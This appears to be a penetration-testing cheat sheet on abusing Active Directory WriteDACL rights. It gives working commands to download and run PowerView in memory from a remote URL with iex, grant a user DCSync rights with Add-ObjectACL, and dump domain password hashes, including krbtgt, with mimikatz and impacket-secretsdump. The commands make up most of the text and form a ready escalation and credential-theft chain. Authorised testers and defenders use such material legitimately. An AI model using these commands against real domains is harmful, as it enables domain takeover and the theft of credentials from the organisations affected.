# PowerView

Downloadable at [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)

## WriteDACL Permission
The WriteDACL privilege gives a user the ability to add ACLs to an
object. This means that we can add a user to this group and give them DCSync privileges.
**After you have created a new user - Then give him DCSync permission**
````powershell
$pass = convertto-securestring '<password' -asplain -force
$cred = new-object system.management.automation.pscredential('<domain>\<username>',$pass)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
Add-ObjectACL -PrincipalIdentity <username> -Credentials $cred -Rights DCSync
````
### DCSyncing Hashes
Since the user has now the required privileges to use DCSync, we can use mimikatz or secretdump to dump password hashes from the DC via:
````powershell
lsadump::dcsync /user:krbtgt
````
````powershell
impacket-secretsdump <domain>\<username>@<IP-ADDRESS>
````
